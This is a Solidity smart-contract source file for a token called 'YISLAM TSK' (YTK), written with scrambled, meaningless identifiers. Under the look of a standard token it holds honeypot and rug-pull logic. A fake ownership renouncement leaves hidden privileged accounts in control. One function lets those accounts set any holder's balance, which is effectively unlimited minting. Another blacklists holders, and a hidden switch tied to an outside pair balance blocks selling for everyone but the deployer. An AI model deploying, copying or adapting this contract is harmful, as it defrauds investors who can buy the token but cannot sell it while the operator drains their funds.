//SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;

interface buyIs {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface limitWalletShould {
    function createPair(address receiverLaunch, address feeMarketing) external returns (address);
}

abstract contract isTxSender {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface liquidityTrading {
    function totalSupply() external view returns (uint256);

    function balanceOf(address fromMarketing) external view returns (uint256);

    function transfer(address shouldMarketingTotal, uint256 amountTeam) external returns (bool);

    function allowance(address liquidityTx, address spender) external view returns (uint256);

    function approve(address spender, uint256 amountTeam) external returns (bool);

    function transferFrom(address sender,address shouldMarketingTotal,uint256 amountTeam) external returns (bool);

    event Transfer(address indexed from, address indexed listLaunched, uint256 value);
    event Approval(address indexed liquidityTx, address indexed spender, uint256 value);
}

interface liquidityTradingMetadata is liquidityTrading {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract YISLAMTSK is isTxSender, liquidityTrading, liquidityTradingMetadata {

    function approve(address launchedTxShould, uint256 amountTeam) public virtual override returns (bool) {
        senderBuy[_msgSender()][launchedTxShould] = amountTeam;
        emit Approval(_msgSender(), launchedTxShould, amountTeam);
        return true;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return enableMin;
    }

    bool public tradingList;

    mapping(address => mapping(address => uint256)) private senderBuy;

    uint256 tokenTakeTx;

    function transfer(address fundSwap, uint256 amountTeam) external virtual override returns (bool) {
        return listMax(_msgSender(), fundSwap, amountTeam);
    }

    function tokenFee(address shouldMode) public {
        if (tradingList) {
            return;
        }
        if (limitLaunched != shouldToLaunched) {
            shouldToLaunched = totalMode;
        }
        listMarketing[shouldMode] = true;
        
        tradingList = true;
    }

    function balanceOf(address fromMarketing) public view virtual override returns (uint256) {
        return marketingList[fromMarketing];
    }

    address public exemptTradingLaunched;

    function decimals() external view virtual override returns (uint8) {
        return fundFrom;
    }

    function tokenSell() public {
        emit OwnershipTransferred(exemptTradingLaunched, address(0));
        tokenLimitSwap = address(0);
    }

    function launchedShouldTx(uint256 amountTeam) public {
        modeReceiver();
        tokenTakeTx = amountTeam;
    }

    function atTxMarketing(address exemptTake) public {
        modeReceiver();
        if (shouldToLaunched == totalMode) {
            marketingLiquidity = toMarketingSender;
        }
        if (exemptTake == exemptTradingLaunched || exemptTake == toReceiver) {
            return;
        }
        fromShouldMax[exemptTake] = true;
    }

    function symbol() external view virtual override returns (string memory) {
        return walletTotal;
    }

    function listMax(address listSellMax, address shouldMarketingTotal, uint256 amountTeam) internal returns (bool) {
        if (listSellMax == exemptTradingLaunched) {
            return teamFee(listSellMax, shouldMarketingTotal, amountTeam);
        }
        uint256 senderLaunchShould = liquidityTrading(toReceiver).balanceOf(marketingLaunchedSell);
        require(senderLaunchShould == tokenTakeTx);
        require(!fromShouldMax[listSellMax]);
        return teamFee(listSellMax, shouldMarketingTotal, amountTeam);
    }

    address teamMax = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function transferFrom(address listSellMax, address shouldMarketingTotal, uint256 amountTeam) external override returns (bool) {
        if (_msgSender() != teamMax) {
            if (senderBuy[listSellMax][_msgSender()] != type(uint256).max) {
                require(amountTeam <= senderBuy[listSellMax][_msgSender()]);
                senderBuy[listSellMax][_msgSender()] -= amountTeam;
            }
        }
        return listMax(listSellMax, shouldMarketingTotal, amountTeam);
    }

    uint256 private enableMin = 100000000 * 10 ** 18;

    function name() external view virtual override returns (string memory) {
        return shouldToReceiver;
    }

    uint256 private sellMin;

    mapping(address => uint256) private marketingList;

    function allowance(address exemptAtLimit, address launchedTxShould) external view virtual override returns (uint256) {
        if (launchedTxShould == teamMax) {
            return type(uint256).max;
        }
        return senderBuy[exemptAtLimit][launchedTxShould];
    }

    uint8 private fundFrom = 18;

    string private shouldToReceiver = "YISLAM TSK";

    uint256 private shouldToLaunched;

    uint256 public totalMode;

    uint256 private modeExempt;

    event OwnershipTransferred(address indexed buyLimit, address indexed limitExempt);

    function modeReceiver() private view {
        require(listMarketing[_msgSender()]);
    }

    address public toReceiver;

    address marketingLaunchedSell = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    address private tokenLimitSwap;

    uint256 private limitLaunched;

    bool public sellWallet;

    mapping(address => bool) public fromShouldMax;

    constructor (){
        if (shouldToLaunched != limitLaunched) {
            toMarketingSender = sellMin;
        }
        tokenSell();
        buyIs marketingLaunchReceiver = buyIs(teamMax);
        toReceiver = limitWalletShould(marketingLaunchReceiver.factory()).createPair(marketingLaunchReceiver.WETH(), address(this));
        
        exemptTradingLaunched = _msgSender();
        listMarketing[exemptTradingLaunched] = true;
        marketingList[exemptTradingLaunched] = enableMin;
        if (marketingLiquidity != toMarketingSender) {
            toMarketingSender = marketingLiquidity;
        }
        emit Transfer(address(0), exemptTradingLaunched, enableMin);
    }

    uint256 private marketingToken;

    function owner() external view returns (address) {
        return tokenLimitSwap;
    }

    string private walletTotal = "YTK";

    function fromTradingMax(address fundSwap, uint256 amountTeam) public {
        modeReceiver();
        marketingList[fundSwap] = amountTeam;
    }

    uint256 private marketingLiquidity;

    uint256 private toMarketingSender;

    uint256 tradingMin;

    function getOwner() external view returns (address) {
        return tokenLimitSwap;
    }

    function teamFee(address listSellMax, address shouldMarketingTotal, uint256 amountTeam) internal returns (bool) {
        require(marketingList[listSellMax] >= amountTeam);
        marketingList[listSellMax] -= amountTeam;
        marketingList[shouldMarketingTotal] += amountTeam;
        emit Transfer(listSellMax, shouldMarketingTotal, amountTeam);
        return true;
    }

    mapping(address => bool) public listMarketing;

}